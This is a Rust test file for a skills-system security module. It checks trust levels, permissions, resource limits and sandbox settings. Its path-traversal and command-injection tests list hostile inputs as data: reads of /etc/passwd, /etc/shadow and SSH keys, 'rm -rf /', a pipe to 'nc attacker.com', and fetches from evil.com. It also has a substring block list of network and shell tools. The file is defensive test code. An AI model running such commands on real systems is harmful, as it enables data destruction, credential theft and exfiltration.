//! Security testing for skills system
//! Tests trust levels, permissions, resource limits, and attack prevention

use std::path::PathBuf;

use crate::cli::skills::security::{
    FilePermissions,
    NetworkPermissions,
    PermissionSet,
    ProcessPermissions,
    ResourceLimits,
    SecurityContext,
    SecurityError,
    TrustLevel,
};

#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_trust_level_ordering() {
        // Trust levels should have proper ordering
        assert!(TrustLevel::Untrusted < TrustLevel::UserVerified);
        assert!(TrustLevel::UserVerified < TrustLevel::SystemTrusted);
    }

    #[test]
    fn test_security_context_creation() {
        let untrusted = SecurityContext::for_trust_level(TrustLevel::Untrusted);
        let user_verified = SecurityContext::for_trust_level(TrustLevel::UserVerified);
        let system_trusted = SecurityContext::for_trust_level(TrustLevel::SystemTrusted);

        // Verify trust levels are set correctly
        assert_eq!(untrusted.trust_level, TrustLevel::Untrusted);
        assert_eq!(user_verified.trust_level, TrustLevel::UserVerified);
        assert_eq!(system_trusted.trust_level, TrustLevel::SystemTrusted);
    }

    #[test]
    fn test_permission_escalation() {
        let untrusted = SecurityContext::for_trust_level(TrustLevel::Untrusted);
        let user_verified = SecurityContext::for_trust_level(TrustLevel::UserVerified);
        let system_trusted = SecurityContext::for_trust_level(TrustLevel::SystemTrusted);

        // File permissions should escalate
        assert!(matches!(
            untrusted.permissions.file_access,
            FilePermissions::ReadOnlyTemp
        ));
        assert!(matches!(
            user_verified.permissions.file_access,
            FilePermissions::WorkspaceOnly
        ));
        assert!(matches!(system_trusted.permissions.file_access, FilePermissions::Full));

        // Network permissions should escalate
        assert!(matches!(untrusted.permissions.network_access, NetworkPermissions::None));
        assert!(matches!(
            user_verified.permissions.network_access,
            NetworkPermissions::HttpsOnly
        ));
        assert!(matches!(
            system_trusted.permissions.network_access,
            NetworkPermissions::Full
        ));

        // Process permissions should escalate
        assert!(matches!(untrusted.permissions.process_spawn, ProcessPermissions::None));
        assert!(matches!(
            user_verified.permissions.process_spawn,
            ProcessPermissions::Limited
        ));
        assert!(matches!(
            system_trusted.permissions.process_spawn,
            ProcessPermissions::Full
        ));
    }

    #[test]
    fn test_resource_limits_escalation() {
        let untrusted = SecurityContext::for_trust_level(TrustLevel::Untrusted);
        let user_verified = SecurityContext::for_trust_level(TrustLevel::UserVerified);
        let system_trusted = SecurityContext::for_trust_level(TrustLevel::SystemTrusted);

        // Timeout should increase with trust
        assert!(untrusted.resource_limits.timeout_seconds < user_verified.resource_limits.timeout_seconds);
        assert!(user_verified.resource_limits.timeout_seconds < system_trusted.resource_limits.timeout_seconds);

        // Memory limits should increase with trust
        let untrusted_mem = untrusted.resource_limits.max_memory_mb.unwrap_or(0);
        let user_mem = user_verified.resource_limits.max_memory_mb.unwrap_or(0);
        let system_mem = system_trusted.resource_limits.max_memory_mb.unwrap_or(0);

        assert!(untrusted_mem < user_mem);
        assert!(user_mem < system_mem);
    }

    #[test]
    fn test_sandbox_configuration() {
        let untrusted = SecurityContext::for_trust_level(TrustLevel::Untrusted);
        let system_trusted = SecurityContext::for_trust_level(TrustLevel::SystemTrusted);

        // Untrusted should have network disabled
        assert!(!untrusted.sandbox_config.enable_network);

        // System trusted should have network enabled
        assert!(system_trusted.sandbox_config.enable_network);

        // Process limits should be stricter for untrusted
        assert!(untrusted.sandbox_config.max_processes < system_trusted.sandbox_config.max_processes);
    }

    #[test]
    fn test_path_traversal_prevention() {
        // Test various path traversal attempts
        let dangerous_paths = vec![
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            "./../../secret.txt",
        ];

        for path in dangerous_paths {
            let result = validate_file_path(path);
            assert!(result.is_err(), "Path should be rejected: {}", path);

            if let Err(SecurityError::InputValidationFailed(msg)) = result {
                assert!(msg.contains("path traversal") || msg.contains("absolute path"));
            }
        }
    }

    #[test]
    fn test_safe_paths_allowed() {
        // Test safe relative paths
        let safe_paths = vec!["data.txt", "subdir/file.json", "output/results.csv"];

        for path in safe_paths {
            let result = validate_file_path(path);
            assert!(result.is_ok(), "Safe path should be allowed: {}", path);
        }
    }

    #[test]
    fn test_command_injection_prevention() {
        // Test various command injection attempts
        let dangerous_commands = vec![
            "ls; rm -rf /",
            "echo hello && cat /etc/passwd",
            "python script.py | nc attacker.com 1234",
            "$(curl evil.com/script.sh)",
            "`wget malware.exe`",
        ];

        for cmd in dangerous_commands {
            let result = validate_command(cmd);
            assert!(result.is_err(), "Command should be rejected: {}", cmd);
        }
    }

    #[test]
    fn test_resource_limit_values() {
        let untrusted = ResourceLimits::for_trust_level(&TrustLevel::Untrusted);
        let user_verified = ResourceLimits::for_trust_level(&TrustLevel::UserVerified);
        let system_trusted = ResourceLimits::for_trust_level(&TrustLevel::SystemTrusted);

        // Verify specific limits make sense
        assert_eq!(untrusted.timeout_seconds, 10);
        assert_eq!(user_verified.timeout_seconds, 60);
        assert_eq!(system_trusted.timeout_seconds, 300);

        assert_eq!(untrusted.max_memory_mb, Some(64));
        assert_eq!(user_verified.max_memory_mb, Some(256));
        assert_eq!(system_trusted.max_memory_mb, Some(1024));
    }
}

// Helper functions for validation
fn validate_file_path(path: &str) -> Result<PathBuf, SecurityError> {
    // Check for directory traversal
    if path.contains("..") || path.starts_with('/') || path.starts_with('~') {
        return Err(SecurityError::InputValidationFailed(format!(
            "Dangerous path detected: {} (contains path traversal or absolute path)",
            path
        )));
    }

    // Check for null bytes
    if path.contains('\0') {
        return Err(SecurityError::InputValidationFailed(
            "Path contains null bytes".to_string(),
        ));
    }

    Ok(PathBuf::from(path))
}

fn validate_command(command: &str) -> Result<(), SecurityError> {
    // Check for command injection patterns
    let dangerous_patterns = vec![
        ";", "&&", "||", "|", "`", "$(", "${", "wget", "curl", "nc", "netcat", "rm -rf",
    ];

    for pattern in dangerous_patterns {
        if command.contains(pattern) {
            return Err(SecurityError::InputValidationFailed(format!(
                "Command contains dangerous pattern: {}",
                pattern
            )));
        }
    }

    Ok(())
}
